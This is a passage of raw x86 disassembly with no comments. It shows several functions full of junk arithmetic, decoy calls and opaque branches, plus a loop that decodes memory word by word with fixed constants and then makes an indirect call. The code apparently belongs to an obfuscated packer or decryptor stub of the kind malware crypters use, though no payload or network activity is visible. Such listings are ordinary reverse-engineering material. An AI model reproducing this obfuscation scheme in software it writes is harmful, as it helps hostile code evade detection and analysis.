  40763f:	xor    DWORD PTR [ebp-0x3c],eax
  407642:	xor    ecx,ecx
  407644:	mov    DWORD PTR [ebp-0x3c],edx
  407647:	and    ebx,ecx
  407649:	or     DWORD PTR [ebp-0x3c],ebx
  40764c:	and    esi,edi
  40764e:	add    DWORD PTR [ebp-0x3c],edi
  407651:	add    DWORD PTR [ebp-0x3c],esi
  407654:	mov    esi,0x44
  407659:	mov    ebx,0x1c
  40765e:	add    esi,esi
  407660:	or     DWORD PTR [ebp-0x3c],ebx
  407663:	sub    DWORD PTR [ebp-0x3c],esi
  407666:	pop    edi
  407667:	mov    ebx,0xad
  40766c:	and    DWORD PTR [ebp-0x3c],ebx
  40766f:	pop    esi
  407670:	add    DWORD PTR [ebp-0x3c],edi
  407673:	pop    ebx
  407674:	mov    ecx,DWORD PTR [ebp-0x3c]
  407677:	cmp    esi,0x6b
  40767a:	jne    0x4076a3
  40767c:	mov    edx,DWORD PTR ds:0x434050
  407682:	and    edx,edi
  407684:	cmp    esi,0x38
  407687:	je     0x4076a3
  407689:	add    DWORD PTR [ebp-0x3c],esi
  40768c:	cmp    ecx,0x8
  40768f:	jne    0x4076a3
  407691:	cmp    esi,eax
  407693:	jne    0x4076a3
  407695:	add    edx,esi
  407697:	add    ecx,edx
  407699:	cmp    ebx,DWORD PTR [ebp-0x14]
  40769c:	jne    0x4076a3
  40769e:	and    ecx,edx
  4076a0:	sub    DWORD PTR [ebp-0x3c],ecx
  4076a3:	leave  
  4076a4:	ret    
  4076a5:	int3   
  4076a6:	int3   
  4076a7:	int3   
  4076a8:	int3   
  4076a9:	int3   
  4076aa:	push   ebp
  4076ab:	mov    ebp,esp
  4076ad:	sub    esp,0x28
  4076b0:	xor    eax,eax
  4076b2:	push   0xa8d0ef00
  4076b7:	push   0x68bf8200
  4076bc:	call   0x408379
  4076c1:	add    esp,0x8
  4076c4:	push   0x3a
  4076c6:	push   0x12
  4076c8:	call   0x408020
  4076cd:	add    esp,0x8
  4076d0:	push   ebx
  4076d1:	mov    ecx,eax
  4076d3:	mov    eax,0x7180
  4076d8:	push   0xffffff8d
  4076da:	push   0xffffffda
  4076dc:	push   0x162cf700
  4076e1:	call   0x408633
  4076e6:	add    esp,0xc
  4076e9:	push   0x75
  4076eb:	push   0x56378600
  4076f0:	push   0xcaeda700
  4076f5:	push   0xffffff83
  4076f7:	call   0x408020
  4076fc:	add    esp,0x10
  4076ff:	push   esi
  407700:	push   0x6487800
  407705:	push   0xf8c1ba00
  40770a:	call   0x408379
  40770f:	add    esp,0x8
  407712:	push   edi
  407713:	push   0xb2afc500
  407718:	push   0xca402300
  40771d:	push   0xffffffb0
  40771f:	push   0xfffffff9
  407721:	call   0x408020
  407726:	add    esp,0x10
  407729:	push   0x48
  40772b:	push   0x5887b700
  407730:	call   0x408020
  407735:	add    esp,0x8
  407738:	mov    eax,DWORD PTR [ebp+0x10]
  40773b:	xor    ebx,ebx
  40773d:	mov    DWORD PTR [ebp-0x14],ebx
  407740:	mov    edx,DWORD PTR [ebp+0x8]
  407743:	mov    ebx,DWORD PTR [ebp-0x14]
  407746:	add    ebx,ebx
  407748:	mov    ecx,ebx
  40774a:	cmp    ecx,0x49
  40774d:	je     0x4077ba
  40774f:	cmp    eax,DWORD PTR [ebp-0x4]
  407752:	jne    0x4077ba
  407754:	mov    esi,eax
  407756:	sub    DWORD PTR [ebp-0x14],ecx
  407759:	sub    esi,eax
  40775b:	add    esi,ebx
  40775d:	cmp    edx,0xc2cd
  407763:	je     0x4077ba
  407765:	sub    DWORD PTR [ebp-0x14],edx
  407768:	sub    esi,ecx
  40776a:	test   esi,0xe2
  407770:	je     0x4077ba
  407772:	cmp    esi,0xfffffff2
  407775:	je     0x4077ba
  407777:	sub    esi,eax
  407779:	xor    ebx,ebx
  40777b:	and    esi,eax
  40777d:	cmp    ecx,eax
  40777f:	jne    0x4077ba
  407781:	cmp    esi,edx
  407783:	jne    0x4077ba
  407785:	sub    esi,ebx
  407787:	cmp    esi,0xffffff80
  40778a:	jne    0x4077ba
  40778c:	cmp    esi,DWORD PTR [ebp-0x8]
  40778f:	jne    0x4077ba
  407791:	sub    esi,ebx
  407793:	mov    ebx,0x15
  407798:	sub    DWORD PTR [ebp-0x14],esi
  40779b:	mov    esi,0x28c99807
  4077a0:	or     DWORD PTR [ebp-0x14],ebx
  4077a3:	or     esi,ecx
  4077a5:	sub    esi,edx
  4077a7:	cmp    esi,0x29a0
  4077ad:	je     0x4077ba
  4077af:	sub    esi,ebx
  4077b1:	mov    ebx,DWORD PTR [ebp-0x14]
  4077b4:	mov    DWORD PTR [ebp-0x14],ebx
  4077b7:	add    DWORD PTR [ebp-0x14],esi
  4077ba:	cmp    DWORD PTR [ebp+0xc],eax
  4077bd:	je     0x4079d8
  4077c3:	mov    ebx,0xaf
  4077c8:	cmp    ecx,edx
  4077ca:	je     0x4077d6
  4077cc:	cmp    eax,0x9574
  4077d1:	jne    0x4077d6
  4077d3:	add    DWORD PTR [ebp-0x14],eax
  4077d6:	mov    edi,DWORD PTR [ebp-0x14]
  4077d9:	sub    DWORD PTR [ebp-0x14],edi
  4077dc:	add    DWORD PTR [ebp-0x14],ebx
  4077df:	dec    DWORD PTR [ebp+0xc]
  4077e2:	mov    esi,0x5e0c
  4077e7:	sub    DWORD PTR [ebp-0x14],esi
  4077ea:	xor    DWORD PTR [edx],0xeea9afff
  4077f0:	sub    ecx,eax
  4077f2:	mov    edi,DWORD PTR [ebp-0x14]
  4077f5:	mov    esi,edx
  4077f7:	cmp    edi,0x48
  4077fa:	je     0x407845
  4077fc:	add    DWORD PTR [ebp-0x14],ecx
  4077ff:	add    DWORD PTR [ebp-0x14],edx
  407802:	mov    ebx,DWORD PTR [ebp-0x14]
  407805:	mov    ecx,edx
  407807:	cmp    ecx,edx
  407809:	jne    0x407845
  40780b:	sub    DWORD PTR [ebp-0x14],ebx
  40780e:	sub    esi,eax
  407810:	cmp    eax,esi
  407812:	je     0x407845
  407814:	test   edi,0x28
  40781a:	jne    0x407845
  40781c:	add    ecx,edx
  40781e:	and    edi,ecx
  407820:	cmp    edi,0x4e
  407823:	je     0x407845
  407825:	cmp    edi,0xb5f3
  40782b:	jne    0x407845
  40782d:	mov    ecx,0x68
  407832:	or     edi,ecx
  407834:	and    edi,edx
  407836:	mov    ebx,0x9a
  40783b:	mov    DWORD PTR [ebp-0x14],esi
  40783e:	cmp    edi,ebx
  407840:	jne    0x407845
  407842:	add    DWORD PTR [ebp-0x14],edi
  407845:	add    DWORD PTR [edx],0x285dd834
  40784b:	sub    esi,edx
  40784d:	sub    esi,edx
  40784f:	mov    edi,DWORD PTR [ebp-0x14]
  407852:	sub    edi,ecx
  407854:	add    DWORD PTR [ebp-0x14],edi
  407857:	or     DWORD PTR [ebp-0x14],edi
  40785a:	add    esi,edi
  40785c:	sub    esi,ecx
  40785e:	cmp    esi,0x29
  407861:	jne    0x407868
  407863:	sub    esi,edi
  407865:	or     DWORD PTR [ebp-0x14],esi
  407868:	xor    DWORD PTR [edx],eax
  40786a:	sub    esi,ecx
  40786c:	mov    ebx,DWORD PTR [ebp-0x14]
  40786f:	or     ebx,esi
  407871:	cmp    ebx,DWORD PTR [ebp-0x28]
  407874:	jne    0x4078b8
  407876:	cmp    ebx,ecx
  407878:	je     0x4078b8
  40787a:	add    DWORD PTR [ebp-0x14],edx
  40787d:	mov    esi,eax
  40787f:	mov    ecx,DWORD PTR [ebp-0x14]
  407882:	or     esi,ecx
  407884:	test   ebx,0x1e
  40788a:	je     0x4078b8
  40788c:	mov    ecx,DWORD PTR [ebp-0x14]
  40788f:	mov    edi,0xaf
  407894:	or     ecx,edi
  407896:	test   esi,0x26
  40789c:	je     0x4078b8
  40789e:	and    ecx,edx
  4078a0:	mov    edi,0x2b
  4078a5:	add    ecx,ebx
  4078a7:	sub    DWORD PTR [ebp-0x14],esi
  4078aa:	mov    esi,0xb4
  4078af:	xor    DWORD PTR [ebp-0x14],edi
  4078b2:	and    DWORD PTR [ebp-0x14],esi
  4078b5:	add    DWORD PTR [ebp-0x14],ecx
  4078b8:	sub    DWORD PTR [edx],0xbec9cd98
  4078be:	cmp    ecx,eax
  4078c0:	je     0x407906
  4078c2:	sub    edi,ebx
  4078c4:	xor    ebx,ebx
  4078c6:	mov    esi,DWORD PTR [ebp-0x14]
  4078c9:	sub    esi,eax
  4078cb:	or     edi,edx
  4078cd:	add    esi,eax
  4078cf:	add    DWORD PTR [ebp-0x14],edx
  4078d2:	sub    esi,edi
  4078d4:	or     esi,eax
  4078d6:	cmp    esi,0xffffffae
  4078d9:	je     0x407906
  4078db:	mov    ebx,DWORD PTR ds:0x434080
  4078e1:	cmp    edx,DWORD PTR [ebp-0x28]
  4078e4:	je     0x407906
  4078e6:	mov    ecx,DWORD PTR ds:0x434090
  4078ec:	add    esi,edx
  4078ee:	add    ecx,edx
  4078f0:	sub    esi,eax
  4078f2:	or     DWORD PTR [ebp-0x14],ecx
  4078f5:	mov    edi,ecx
  4078f7:	add    DWORD PTR [ebp-0x14],edi
  4078fa:	sub    esi,ebx
  4078fc:	test   eax,0x44
  407901:	jne    0x407906
  407903:	sub    DWORD PTR [ebp-0x14],esi
  407906:	add    edx,0x4
  407909:	cmp    ecx,0xffffffdd
  40790c:	jne    0x4079d3
  407912:	add    esi,ebx
  407914:	cmp    esi,0x74
  407917:	je     0x4079d3
  40791d:	mov    edi,DWORD PTR ds:0x434090
  407923:	add    DWORD PTR [ebp-0x14],edi
  407926:	xor    edi,edi
  407928:	cmp    esi,0xffffffc5
  40792b:	je     0x4079d3
  407931:	add    DWORD PTR [ebp-0x14],edi
  407934:	mov    ebx,DWORD PTR [ebp-0x14]
  407937:	mov    edi,0x83c2
  40793c:	or     ebx,esi
  40793e:	cmp    edx,DWORD PTR [ebp-0x28]
  407941:	jne    0x4079d3
  407947:	cmp    esi,DWORD PTR [ebp-0x4]
  40794a:	je     0x4079d3
  407950:	add    ebx,esi
  407952:	sub    ebx,ecx
  407954:	sub    DWORD PTR [ebp-0x14],eax
  407957:	mov    esi,DWORD PTR ds:0x43408c
  40795d:	add    esi,ebx
  40795f:	cmp    esi,0x7d
  407962:	jne    0x4079d3
  407964:	cmp    esi,DWORD PTR ds:0x434090
  40796a:	je     0x4079d3
  40796c:	sub    DWORD PTR [ebp-0x14],edx
  40796f:	mov    ecx,DWORD PTR [ebp-0x14]
  407972:	mov    ebx,ecx
  407974:	add    DWORD PTR [ebp-0x14],ebx
  407977:	test   esi,0xed
  40797d:	je     0x4079d3
  40797f:	cmp    esi,0x4580
  407985:	jne    0x4079d3
  407987:	mov    ebx,DWORD PTR [ebp-0x14]
  40798a:	add    esi,ecx
  40798c:	cmp    esi,edi
  40798e:	je     0x4079d3
  407990:	mov    edi,edx
  407992:	sub    edi,ebx
  407994:	mov    ebx,DWORD PTR [ebp-0x14]
  407997:	add    esi,edx
  407999:	or     esi,ebx
  40799b:	sub    edi,ebx
  40799d:	sub    DWORD PTR [ebp-0x14],edi
  4079a0:	and    esi,ebx
  4079a2:	sub    esi,edx
  4079a4:	cmp    esi,DWORD PTR ds:0x434090
  4079aa:	je     0x4079d3
  4079ac:	cmp    eax,ecx
  4079ae:	je     0x4079d3
  4079b0:	cmp    esi,0xffffff9e
  4079b3:	je     0x4079d3
  4079b5:	cmp    ecx,0x79
  4079b8:	je     0x4079d3
  4079ba:	mov    ecx,ebx
  4079bc:	add    DWORD PTR [ebp-0x14],ebx
  4079bf:	mov    edi,DWORD PTR [ebp-0x14]
  4079c2:	sub    ecx,ebx
  4079c4:	add    ecx,eax
  4079c6:	sub    DWORD PTR [ebp-0x14],ecx
  4079c9:	sub    DWORD PTR [ebp-0x14],esi
  4079cc:	sub    edi,ebx
  4079ce:	sub    edi,ecx
  4079d0:	sub    DWORD PTR [ebp-0x14],edi
  4079d3:	jmp    0x407743
  4079d8:	push   0xeab69000
  4079dd:	call   0x4080ed
  4079e2:	add    esp,0x4
  4079e5:	xor    ebx,ebx
  4079e7:	push   0x10
  4079e9:	call   0x408379
  4079ee:	add    esp,0x4
  4079f1:	push   0xee735e00
  4079f6:	push   0x72fdbb00
  4079fb:	push   0xa
  4079fd:	push   0x5a27b700
  407a02:	call   0x408020
  407a07:	add    esp,0x10
  407a0a:	push   0x74
  407a0c:	push   0x46334b00
  407a11:	push   0x48
  407a13:	push   0xfffffff2
  407a15:	call   0x408633
  407a1a:	add    esp,0x10
  407a1d:	add    DWORD PTR [ebp-0x14],ebx
  407a20:	sub    eax,ebx
  407a22:	push   0xffffffa3
  407a24:	push   0x40
  407a26:	call   0x4080ed
  407a2b:	add    esp,0x8
  407a2e:	pop    edi
  407a2f:	cmp    edi,DWORD PTR ds:0x434090
  407a35:	jne    0x407a43
  407a37:	sub    eax,edi
  407a39:	push   0x79
  407a3b:	call   0x408633
  407a40:	add    esp,0x4
  407a43:	call   0x408379
  407a48:	pop    esi
  407a49:	add    ebx,eax
  407a4b:	push   0xeacde400
  407a50:	push   0x2a4a8100
  407a55:	push   0xffffffdc
  407a57:	call   0x408379
  407a5c:	add    esp,0xc
  407a5f:	push   0xf206ec00
  407a64:	push   0x7653f500
  407a69:	push   0xffffffa2
  407a6b:	push   0x42241f00
  407a70:	push   0xd6725500
  407a75:	call   0x408020
  407a7a:	add    esp,0x14
  407a7d:	sub    DWORD PTR [ebp-0x14],ebx
  407a80:	push   0x62091100
  407a85:	push   0x77
  407a87:	push   0x4a2c2100
  407a8c:	push   0xffffff90
  407a8e:	call   0x408379
  407a93:	add    esp,0x10
  407a96:	pop    ebx
  407a97:	mov    ecx,DWORD PTR [ebp-0x14]
  407a9a:	mov    edx,DWORD PTR [ebp-0x14]
  407a9d:	sub    edx,eax
  407a9f:	cmp    edx,ebx
  407aa1:	je     0x407ab2
  407aa3:	and    edx,ecx
  407aa5:	push   0xfdb7e700
  407aaa:	call   0x408633
  407aaf:	add    esp,0x4
  407ab2:	push   0x2
  407ab4:	push   0xffffffe0
  407ab6:	push   0xffffffba
  407ab8:	push   0xffffffbb
  407aba:	push   0x51
  407abc:	call   0x4080ed
  407ac1:	add    esp,0x14
  407ac4:	leave  
  407ac5:	ret    0xc
  407ac8:	int3   
  407ac9:	int3   
  407aca:	int3   
  407acb:	int3   
  407acc:	int3   
  407acd:	push   ebp
  407ace:	mov    ebp,esp
  407ad0:	sub    esp,0x2c
  407ad3:	push   0x33
  407ad5:	push   0xef39b100
  407ada:	push   0x11d5ef00
  407adf:	push   0xffffff8f
  407ae1:	push   0xffffff93
  407ae3:	call   0x408020
  407ae8:	add    esp,0x14
  407aeb:	push   ebx
  407aec:	call   0x408633
  407af1:	push   esi
  407af2:	push   0xd
  407af4:	push   0x4d1f2000
  407af9:	push   0xffffffbe
  407afb:	push   0xa1a6e000
  407b00:	push   0x1d
  407b02:	call   0x408379
  407b07:	add    esp,0x14
  407b0a:	call   0x408633
  407b0f:	push   edi
  407b10:	push   0xdf7f6500
  407b15:	push   0xffffffe2
  407b17:	push   0x49
  407b19:	call   0x408020
  407b1e:	add    esp,0xc
  407b21:	push   0xd1f6de00
  407b26:	push   0x9f42f900
  407b2b:	push   0xdda62b00
  407b30:	push   0x22
  407b32:	call   0x408379
  407b37:	add    esp,0x10
  407b3a:	call   0x408633
  407b3f:	mov    esi,0x5eb3f5f9
  407b44:	call   0x408379
  407b49:	push   0xaf229800
  407b4e:	push   0x11bdd400
  407b53:	push   0x9d831700
  407b58:	push   0xffffffa9
  407b5a:	push   0xc9842e00
  407b5f:	call   0x408379
  407b64:	add    esp,0x14
  407b67:	sub    esi,0x5eb3f5b9
  407b6d:	push   0x5a
  407b6f:	push   0x2a
  407b71:	push   0x2f1afe00
  407b76:	push   0xfffffffb
  407b78:	push   0xc1814f00
  407b7d:	call   0x4080ed
  407b82:	add    esp,0x14
  407b85:	push   esi
  407b86:	push   0xffffffab
  407b88:	call   0x408379
  407b8d:	add    esp,0x4
  407b90:	push   0x49df0e00
  407b95:	call   0x408020
  407b9a:	add    esp,0x4
  407b9d:	mov    ebx,0xea64e965
  407ba2:	push   0xb59ec900
  407ba7:	call   0x408020
  407bac:	add    esp,0x4
  407baf:	add    ebx,0x159b269b
  407bb5:	push   0x4d229c00
  407bba:	push   0xffffff8b
  407bbc:	push   0xffffffa2
  407bbe:	push   0x6f57bb00
  407bc3:	push   0xd874000
  407bc8:	call   0x408379
  407bcd:	add    esp,0x14
  407bd0:	push   0xffffffed
  407bd2:	push   0x79d3b800
  407bd7:	push   0xffffffdb
  407bd9:	push   0x61
  407bdb:	call   0x408379
  407be0:	add    esp,0x10
  407be3:	push   ebx
  407be4:	mov    DWORD PTR [ebp-0x14],eax
  407be7:	push   0x5e049
  407bec:	call   0x4080ed
  407bf1:	push   0x0
  407bf3:	call   0x4080ed
  407bf8:	call   0x408633
  407bfd:	mov    ebx,0xc8aebc1f
  407c02:	push   0xfdaede00
  407c07:	push   0xdf0eec00
  407c0c:	push   0xa1cc3a00
  407c11:	push   0x47
  407c13:	push   0xffffffe3
  407c15:	call   0x408379
  407c1a:	add    esp,0x14
  407c1d:	push   0xfffffff4
  407c1f:	call   0x408020
  407c24:	add    esp,0x4
  407c27:	sub    ebx,0xc86d89db
  407c2d:	and    eax,ebx
  407c2f:	push   0xedadcd00
  407c34:	push   0x39
  407c36:	call   0x4080ed
  407c3b:	add    esp,0x8
  407c3e:	call   DWORD PTR [ebx]
  407c40:	and    DWORD PTR [ebp-0x14],eax
  407c43:	mov    DWORD PTR [ebp-0x28],eax
  407c46:	add    DWORD PTR [ebp-0x14],ebx
  407c49:	mov    edi,0xea0e596b
  407c4e:	mov    ecx,0xed
  407c53:	push   0xffffff82
  407c55:	call   0x4080ed
  407c5a:	add    esp,0x4
  407c5d:	push   0xc1f21a00
  407c62:	push   0xd99f9000
  407c67:	push   0xffffffe7
  407c69:	push   0x46
  407c6b:	push   0x69
  407c6d:	call   0x408633
  407c72:	add    esp,0x14
  407c75:	add    edi,0x1634e695
  407c7b:	add    DWORD PTR [ebp-0x14],eax
  407c7e:	push   0xfffffff9
  407c80:	push   0x41
  407c82:	call   0x4080ed
  407c87:	add    esp,0x8
  407c8a:	mov    DWORD PTR [ebp-0x10],edi
  407c8d:	call   0x408379
  407c92:	push   0xcf7ee500
  407c97:	call   0x408633
  407c9c:	add    esp,0x4
  407c9f:	mov    edi,DWORD PTR [ebp-0x28]
  407ca2:	cmp    edi,0xffffff9b
  407ca5:	jne    0x407cba
  407ca7:	push   0xffffffac
  407ca9:	push   0x6c
  407cab:	push   0xffffffeb
  407cad:	push   0x1d988f00
  407cb2:	call   0x4080ed
  407cb7:	add    esp,0x10
  407cba:	call   0x408379
  407cbf:	push   0xffffffff
  407cc1:	push   0x4d76d200
  407cc6:	call   0x408020
  407ccb:	add    esp,0x8
  407cce:	call   0x408020
  407cd3:	mov    ebx,DWORD PTR [ebp-0x10]
  407cd6:	test   ebx,0xb4
  407cdc:	jne    0x407cfc
  407cde:	push   0xd1922000
  407ce3:	push   0xd9e44e00
  407ce8:	push   0x4d825100
  407ced:	push   0x5e
  407cef:	push   0x9f7ba700
  407cf4:	call   0x4080ed
  407cf9:	add    esp,0x14
  407cfc:	call   0x4080ed
  407d01:	mov    esi,DWORD PTR [ebx]
  407d03:	push   0x3b
  407d05:	call   0x408633
  407d0a:	add    esp,0x4
  407d0d:	push   0x35431100
  407d12:	push   0x59e89d00
  407d17:	push   0x2d
  407d19:	push   0x38
  407d1b:	call   0x408020
  407d20:	add    esp,0x10
  407d23:	mov    ecx,DWORD PTR [ebx+0x4]
  407d26:	mov    ebx,0xc2
  407d2b:	xor    eax,eax
  407d2d:	cmp    esi,0x61
  407d30:	jne    0x407d48
  407d32:	mov    eax,DWORD PTR [ebp-0x14]
  407d35:	mov    edx,esi
  407d37:	sub    DWORD PTR [ebp-0x14],ebx
  407d3a:	sub    DWORD PTR [ebp-0x14],edx
  407d3d:	and    DWORD PTR [ebp-0x14],ecx
  407d40:	cmp    eax,0xffffffcf
  407d43:	jne    0x407d48
  407d45:	sub    DWORD PTR [ebp-0x14],eax
  407d48:	or     esi,esi
  407d4a:	je     0x407fc5
  407d50:	sub    ebx,edi
  407d52:	or     ebx,eax
  407d54:	mov    edx,DWORD PTR [ebp-0x14]
  407d57:	test   edi,0x97
  407d5d:	je     0x407d65
  407d5f:	add    DWORD PTR [ebp-0x14],edx
  407d62:	sub    DWORD PTR [ebp-0x14],ebx
  407d65:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d67:	call   0x4080ed
  407d6c:	test   esi,0x4a
  407d72:	je     0x407f95
  407d78:	mov    eax,DWORD PTR [ebp-0x14]
  407d7b:	push   0xef369b00
  407d80:	push   0xffffffa2
  407d82:	push   0x5957400
  407d87:	call   0x4080ed
  407d8c:	add    esp,0xc
  407d8f:	push   0x3f
  407d91:	push   0x2
  407d93:	push   0x1e
  407d95:	push   0x57
  407d97:	push   0x79a73000
  407d9c:	call   0x408379
  407da1:	add    esp,0x14
  407da4:	push   0x4df2c700
  407da9:	push   0x6f268d00
  407dae:	push   0x299b2300
  407db3:	push   0xffffff90
  407db5:	push   0xcf0e4400
  407dba:	call   0x408379
  407dbf:	add    esp,0x14
  407dc2:	mov    edx,DWORD PTR [ebp-0x14]
  407dc5:	push   0x66
  407dc7:	push   0x69
  407dc9:	call   0x4080ed
  407dce:	add    esp,0x8
  407dd1:	push   0x20
  407dd3:	call   0x408379
  407dd8:	add    esp,0x4
  407ddb:	call   0x408379
  407de0:	or     esi,ebx
  407de2:	call   0x4080ed
  407de7:	test   ebx,0xad
  407ded:	je     0x407f95
  407df3:	mov    ebx,DWORD PTR [ebp-0x14]
  407df6:	cmp    edi,0x1306
  407dfc:	jne    0x407f95
  407e02:	push   0xffffff81
  407e04:	push   0xffffff83
  407e06:	push   0x8597d000
  407e0b:	push   0x6f062500
  407e10:	push   0xb
  407e12:	call   0x4080ed
  407e17:	add    esp,0x14
  407e1a:	call   0x408633
  407e1f:	push   0x4f366700
  407e24:	push   0xcd79d600
  407e29:	push   0xeddd0600
  407e2e:	call   0x408633
  407e33:	add    esp,0xc
  407e36:	push   0xffffff99
  407e38:	call   0x4080ed
  407e3d:	add    esp,0x4
  407e40:	add    DWORD PTR [ebp-0x14],ebx
  407e43:	and    DWORD PTR [ebp-0x14],ebx
  407e46:	add    esi,ebx
  407e48:	mov    ecx,DWORD PTR [ebp-0x14]
  407e4b:	push   0xc5d60300
  407e50:	push   0x51
  407e52:	push   0xfffffff6
  407e54:	push   0x72
  407e56:	call   0x408379
  407e5b:	add    esp,0x10
  407e5e:	push   0x752d3400
  407e63:	push   0xcd3aee00
  407e68:	push   0x91c1ae00
  407e6d:	push   0x72
  407e6f:	call   0x4080ed
  407e74:	add    esp,0x10
  407e77:	cmp    edi,eax
  407e79:	jne    0x407f95
  407e7f:	add    esi,esi
  407e81:	push   0x751da500
  407e86:	push   0xffffffac
  407e88:	push   0xffffff83
  407e8a:	push   0xffffffc0
  407e8c:	call   0x408020
  407e91:	add    esp,0x10
  407e94:	push   0xd
  407e96:	push   0xff662f00
  407e9b:	call   0x408633
  407ea0:	add    esp,0x8
  407ea3:	call   0x4080ed
  407ea8:	push   0xff6dfd00
  407ead:	push   0x72
  407eaf:	push   0xa1b97000
  407eb4:	push   0xfffffff5
  407eb6:	call   0x408633
  407ebb:	add    esp,0x10
  407ebe:	call   0x408379
  407ec3:	mov    eax,DWORD PTR [ebp-0x14]
  407ec6:	push   0xffffffac
  407ec8:	call   0x4080ed
  407ecd:	add    esp,0x4
  407ed0:	cmp    edi,0x9213
  407ed6:	je     0x407f95
  407edc:	push   0x798b4b00
  407ee1:	push   0xc9bd8900
  407ee6:	push   0x2f2b6c00
  407eeb:	call   0x408379
  407ef0:	add    esp,0xc
  407ef3:	test   esi,0x8
  407ef9:	jne    0x407f95
  407eff:	push   0x0
  407f01:	push   0x15be1700
  407f06:	push   0x2984c700
  407f0b:	push   0xf9eef200
  407f10:	call   0x408020
  407f15:	add    esp,0x10
  407f18:	mov    eax,0x16
  407f1d:	call   0x408020
  407f22:	call   0x408633
  407f27:	push   0x75705a00
  407f2c:	push   0xfffffff7
  407f2e:	call   0x4080ed
  407f33:	add    esp,0x8
  407f36:	push   0xaf3b4f00
  407f3b:	push   0xa591e600
  407f40:	push   0xcd103900
  407f45:	push   0xffffffbe
  407f47:	call   0x408379
  407f4c:	add    esp,0x10
  407f4f:	or     esi,edi
  407f51:	push   0x56
  407f53:	push   0xffffffc9
  407f55:	call   0x408633
  407f5a:	add    esp,0x8
  407f5d:	add    esi,eax
  407f5f:	push   0xffffffe0
  407f61:	push   0x74
  407f63:	push   0xffffff97
  407f65:	call   0x4080ed
  407f6a:	add    esp,0xc
  407f6d:	push   0xb52a9700
  407f72:	push   0x79b20d00
  407f77:	push   0x19f94000
  407f7c:	push   0xffffffa7
  407f7e:	call   0x4080ed
  407f83:	add    esp,0x10
  407f86:	push   0x32
  407f88:	push   0x21
  407f8a:	call   0x4080ed
  407f8f:	add    esp,0x8
  407f92:	add    DWORD PTR [ebp-0x14],esi
  407f95:	add    DWORD PTR [ebp-0x10],0x8
  407f99:	mov    eax,DWORD PTR [ebp-0x14]
  407f9c:	mov    ecx,DWORD PTR [ebp-0x14]
  407f9f:	xor    DWORD PTR [ebp-0x14],ecx
  407fa2:	add    DWORD PTR [ebp-0x14],ebx
  407fa5:	push   0x8f1d2200
  407faa:	push   0xffffffc2
  407fac:	push   0xd
  407fae:	call   0x408633
  407fb3:	add    esp,0xc
  407fb6:	push   0x74
  407fb8:	call   0x408379
  407fbd:	add    esp,0x4
  407fc0:	jmp    0x407ca2
  407fc5:	push   0xffffffc4
  407fc7:	push   0x6596aa00
  407fcc:	push   0x759f5400
  407fd1:	push   0x33
  407fd3:	push   0xf180fc00
  407fd8:	call   0x408020
  407fdd:	add    esp,0x14
  407fe0:	push   0x26
  407fe2:	push   0x4dc8c300
  407fe7:	call   0x408379
  407fec:	add    esp,0x8
  407fef:	call   0x408020
  407ff4:	mov    eax,DWORD PTR [ebp-0x28]
  407ff7:	xor    edi,edi
  407ff9:	sub    edi,eax
  407ffb:	add    DWORD PTR [ebp-0x14],edi
  407ffe:	test   edi,0xe0
  408004:	jne    0x40800d
  408006:	sub    edi,eax
  408008:	add    edi,edi
  40800a:	add    DWORD PTR [ebp-0x14],edi
  40800d:	pop    edi
  40800e:	mov    DWORD PTR [ebp-0x14],edi
  408011:	pop    esi
  408012:	add    DWORD PTR [ebp-0x14],esi
  408015:	pop    ebx
  408016:	sub    DWORD PTR [ebp-0x14],ebx
  408019:	leave  
  40801a:	ret    
  40801b:	int3   
  40801c:	int3   
  40801d:	int3   
  40801e:	int3   
  40801f:	int3   
  408020:	push   ebp
  408021:	mov    ebp,esp
  408023:	sub    esp,0x3c
  408026:	mov    ecx,0x21
  40802b:	mov    eax,DWORD PTR ds:0x434044
  408031:	call   0x408633
  408036:	push   ebx
  408037:	mov    DWORD PTR [ebp-0x34],eax
  40803a:	push   esi
  40803b:	test   eax,0x6a
  408040:	je     0x408047
  408042:	call   0x408633
  408047:	push   edi
  408048:	mov    esi,0xdd
  40804d:	call   0x408633
  408052:	mov    edi,DWORD PTR [ebp-0x34]
  408055:	sub    esi,eax
  408057:	cmp    edi,esi
  408059:	jne    0x40807f
  40805b:	call   0x408633
  408060:	or     edi,esi
  408062:	push   0xffffffbb
  408064:	push   0x75
  408066:	push   0x47
  408068:	call   0x408633
  40806d:	add    esp,0xc
  408070:	add    edi,esi
  408072:	push   0x31
  408074:	call   0x408633
  408079:	add    esp,0x4
  40807c:	sub    DWORD PTR [ebp-0x34],edi
  40807f:	push   0x399f3f00
  408084:	push   0xffffffe2
  408086:	push   0xffffff93
  408088:	push   0xffffffbf
  40808a:	call   0x408633
  40808f:	add    esp,0x10
  408092:	add    DWORD PTR [ebp-0x34],esi
  408095:	call   0x408633
  40809a:	push   0xffffff9f
  40809c:	push   0xffffffc5
  40809e:	push   0x5ff1e00
  4080a3:	push   0x8f271000
  4080a8:	call   0x408633
  4080ad:	add    esp,0x10
  4080b0:	test   edi,0xe0
  4080b6:	je     0x4080bd
  4080b8:	sub    edi,eax
  4080ba:	add    DWORD PTR [ebp-0x34],edi
  4080bd:	pop    edi
  4080be:	push   0x2e
  4080c0:	call   0x408633
  4080c5:	add    esp,0x4
  4080c8:	pop    esi
  4080c9:	push   0x6d
  4080cb:	call   0x408633
  4080d0:	add    esp,0x4
  4080d3:	push   0x4d478a00
  4080d8:	call   0x408633
  4080dd:	add    esp,0x4
  4080e0:	pop    ebx
  4080e1:	call   0x408633
  4080e6:	leave  
  4080e7:	ret    
  4080e8:	int3   
  4080e9:	int3   
  4080ea:	int3   
  4080eb:	int3   
  4080ec:	int3   
  4080ed:	push   ebp
  4080ee:	mov    ebp,esp
  4080f0:	sub    esp,0x30
  4080f3:	push   0x85c9f300
  4080f8:	push   0xffffff9d
  4080fa:	call   0x408633
  4080ff:	add    esp,0x8
  408102:	push   ebx
  408103:	push   0xc9d38500
  408108:	push   0xffffff90
  40810a:	call   0x408633
  40810f:	add    esp,0x8
  408112:	push   esi
  408113:	push   0xe5dd4100
  408118:	push   0x3f2e3000
  40811d:	call   0x408633
  408122:	add    esp,0x8
  408125:	push   0xffffffb6
  408127:	push   0x3a
  408129:	push   0x4a
  40812b:	push   0x50
  40812d:	call   0x408633
  408132:	add    esp,0x10
  408135:	push   edi
  408136:	mov    edi,eax
  408138:	sub    edi,eax
  40813a:	push   0xff31ee00
  40813f:	push   0xf6c8800
  408144:	call   0x408633
  408149:	add    esp,0x8
  40814c:	mov    eax,DWORD PTR ds:0x434054
  408152:	push   0x9188c100
